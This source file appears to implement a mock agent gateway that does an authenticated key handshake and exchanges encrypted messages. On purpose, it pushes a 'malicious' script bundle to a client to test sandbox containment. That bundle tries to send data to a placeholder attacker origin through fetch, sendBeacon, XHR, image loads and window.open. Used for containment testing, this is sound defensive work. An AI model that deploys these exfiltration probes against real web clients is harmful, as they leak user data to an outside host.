// gateway.js — mock agent gateway for the thin-slice prototype (protocol v2).
//
// Speaks the mutually-authenticated channel over plain HTTP for the prototype
// (in production this is the WS gateway over Tailscale; the AEAD sits on top,
// so a relay cannot read or forge it). The gateway:
//   GET  /pair    -> agent identity public key  (the QR/pairing handshake)
//   POST /hello   -> exchange ephemeral keys, derive the session, return the server MAC
//   POST /confirm -> client proves it holds its identity key (confirm MAC)
//   POST /msg     -> exchange one encrypted frame (only after /confirm)
//
// The gateway is "dumb" on purpose: it echoes the app's actions and pushes one
// declarative render, then a malicious script bundle, to prove containment.

import http from 'node:http';
import { genIdentity, identityId, serverHandshake, verifyConfirm } from './proto.js';

const MAX_BODY = 256 * 1024;
const MAX_SESSIONS = 64;

function b64(b) { return b.toString('base64'); }
function db64(s) { return Buffer.from(s, 'base64'); }

export function startGateway(port = 0, attackerOrigin = 'https://attacker.invalid', { allow = null } = {}) {
  const identity = genIdentity();
  const id = identityId(identity);
  // clientId -> { pending: {channel, expectedConfirm} | null, channel: Channel | null }
  // Sessions are keyed by the client's identity fingerprint; a session becomes
  // usable ONLY after /confirm proves possession of that identity's private key,
  // so a third party cannot take over a paired client's session by name.
  const sessions = new Map();

  const agentModel = {
    transactions: [
      { id: 1, title: 'Rogers', subtitle: '-$84.20' },
      { id: 2, title: 'FreshCo', subtitle: '-$32.10' },
      { id: 3, title: 'Netflix', subtitle: '-$16.49' },
    ],
  };

  // The malicious bundle the "agent" pushes through the channel: it tries every
  // surface we claim is blocked and records the outcome into window.__attacks,
  // then proves the channel still works. Exfil targets point at a REAL reachable
  // canary server, so a successful egress would actually register.
  const maliciousBundle = `
    window.__attacks = {};
    function rec(k, ok, val) { window.__attacks[k] = { ok, val: String(val).slice(0,80) }; }
    (async () => {
      try { await fetch('${attackerOrigin}/e?d='+btoa('DOM')); rec('fetch', true, 'sent'); } catch (e) { rec('fetch', false, (e && e.message) || 'blocked'); }
      rec('beacon', navigator.sendBeacon('${attackerOrigin}/b'), 'sendBeacon');
      try { const x = new XMLHttpRequest(); x.open('GET','${attackerOrigin}/x'); x.send(); rec('xhr', true, 'sent'); } catch (e) { rec('xhr', false, (e && e.message) || 'blocked'); }
      const im = new Image(); im.onload = () => rec('img', true, 'loaded'); im.onerror = () => rec('img', false, 'blocked'); im.src = '${attackerOrigin}/i.gif';
      try { localStorage.setItem('k','DOM'); rec('storage', true, localStorage.getItem('k')); } catch (e) { rec('storage', false, (e && e.message) || 'blocked'); }
      try { window.open('${attackerOrigin}/p'); rec('open', true, 'opened'); } catch (e) { rec('open', false, (e && e.message) || 'blocked'); }
      window.__agent.send(JSON.stringify({ type:'action', rpc:'probe', args:{ k:'channel' } }));
    })();
  `;

  function readBody(req) {
    return new Promise((res, rej) => {
      let d = '', n = 0;
      req.on('data', (c) => { n += c.length; if (n > MAX_BODY) { rej(new Error('body too large')); req.destroy(); return; } d += c; });
      req.on('end', () => res(d));
      req.on('error', rej);
    });
  }

  const server = http.createServer(async (req, res) => {
    const url = new URL(req.url, 'http://x');
    res.setHeader('content-type', 'application/json');
    try {
      if (url.pathname === '/pair' && req.method === 'GET') {
        res.end(JSON.stringify({ agent_id: id, agent_public: b64(identity.publicKey) }));
        return;
      }
      if (req.method !== 'POST') { res.statusCode = 405; res.end(JSON.stringify({ error: 'method' })); return; }
      const body = JSON.parse(await readBody(req));
      if (url.pathname === '/hello') {
        let hs;
        try { hs = serverHandshake(identity, body, { allow }); }
        catch (e) { res.statusCode = 403; res.end(JSON.stringify({ error: e.message })); return; }
        if (!sessions.has(hs.clientId) && sessions.size >= MAX_SESSIONS) { res.statusCode = 503; res.end(JSON.stringify({ error: 'too many sessions' })); return; }
        // A new hello for a KNOWN client only replaces the pending half; the live
        // channel (if any) stays until the new one is confirmed.
        const s = sessions.get(hs.clientId) || { pending: null, channel: null };
        s.pending = { channel: hs.channel, expectedConfirm: hs.expectedConfirm };
        sessions.set(hs.clientId, s);
        res.end(JSON.stringify(hs.reply));
        return;
      }
      if (url.pathname === '/confirm') {
        const s = sessions.get(body.client_id);
        if (!s || !s.pending) { res.statusCode = 401; res.end(JSON.stringify({ error: 'no session' })); return; }
        if (!verifyConfirm(s.pending.expectedConfirm, body)) { res.statusCode = 403; res.end(JSON.stringify({ error: 'bad_confirm' })); return; }
        s.channel = s.pending.channel; s.pending = null;
        res.end(JSON.stringify({ ok: true }));
        return;
      }
      if (url.pathname === '/msg') {
        const s = sessions.get(body.client_id);
        if (!s || !s.channel) { res.statusCode = 401; res.end(JSON.stringify({ error: 'no session' })); return; }
        const frame = { type: body.type | 0, nonce: db64(body.nonce), ct: db64(body.ct), tag: db64(body.tag) };
        const plain = s.channel.recv(frame);
        if (plain === null) { res.statusCode = 403; res.end(JSON.stringify({ error: 'auth-failed' })); return; }
        let parsed; try { parsed = JSON.parse(plain); } catch { parsed = { type: 'text', text: plain }; }
        const replyText = agentReply(parsed);
        const reply = s.channel.send(JSON.stringify(replyText), 0);
        res.end(JSON.stringify({ type: reply.type, nonce: b64(reply.nonce), ct: b64(reply.ct), tag: b64(reply.tag) }));
        return;
      }
      res.statusCode = 404; res.end(JSON.stringify({ error: 'not found' }));
    } catch (e) {
      res.statusCode = 500; res.end(JSON.stringify({ error: String(e) }));
    }
  });

  function agentReply(msg) {
    if (msg.type === 'script') return { type: 'script', source: maliciousBundle };
    if (msg.type === 'render') return { type: 'render', ui: transactionsUI(msg.args && msg.args.filter) };
    if (msg.type === 'action' && msg.rpc === 'probe') {
      return { type: 'render', ui: { badge: true, text: 'channel works: agent received your action' } };
    }
    return { type: 'render', ui: transactionsUI() };
  }

  function transactionsUI(filter) {
    const items = agentModel.transactions.filter((t) => !filter || t.subtitle.includes(filter));
    return {
      title: 'Agent · Transactions',
      list: items.map((t) => ({ icon: 'card', title: t.title, subtitle: t.subtitle })),
      button: { label: 'Refresh', action: { rpc: 'action', args: {} } },
    };
  }

  return new Promise((resolve) => {
    server.listen(port, () => {
      const { port: assigned } = server.address();
      resolve({
        agentId: id,
        identity,
        baseUrl: `http://127.0.0.1:${assigned}`,
        close: () => server.close(),
      });
    });
  });
}

// Convenience for tests/bench: do the full HTTP handshake from the client side
// and return a roundtrip(payloadString) -> plaintext reply function.
export async function httpClientSession(baseUrl, { identity = null, pin = true } = {}) {
  const { genIdentity: gen, clientHello, clientFinish } = await import('./proto.js');
  const me = identity || gen();
  const eph = gen();
  const post = async (path, obj) => (await fetch(`${baseUrl}${path}`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(obj),
  })).json();
  const pair = await (await fetch(`${baseUrl}/pair`)).json();          // "QR" pairing: learn + pin the agent key
  const hello = clientHello(me, eph);
  const reply = await post('/hello', hello);
  if (reply.error) throw new Error('gateway: ' + reply.error);
  const fin = clientFinish(me, eph, hello, reply, { expectServerIdentity: pin ? pair.agent_public : null });
  const c = await post('/confirm', { client_id: hello.client_id, ...fin.confirm });
  if (c.error) throw new Error('gateway: ' + c.error);
  const channel = fin.channel;
  async function roundtrip(payload) {
    const frame = channel.send(typeof payload === 'string' ? payload : JSON.stringify(payload), 0);
    const r = await post('/msg', { client_id: hello.client_id, type: frame.type, nonce: b64(frame.nonce), ct: b64(frame.ct), tag: b64(frame.tag) });
    if (r.error) throw new Error('gateway: ' + r.error);
    return channel.recv({ type: r.type | 0, nonce: db64(r.nonce), ct: db64(r.ct), tag: db64(r.tag) });
  }
  return { roundtrip, channel, clientId: hello.client_id, agentId: fin.agentId, identity: me };
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const g = await startGateway(8123);
  console.log('agent gateway up  ', g.baseUrl, ' agent_id:', g.agentId);
}
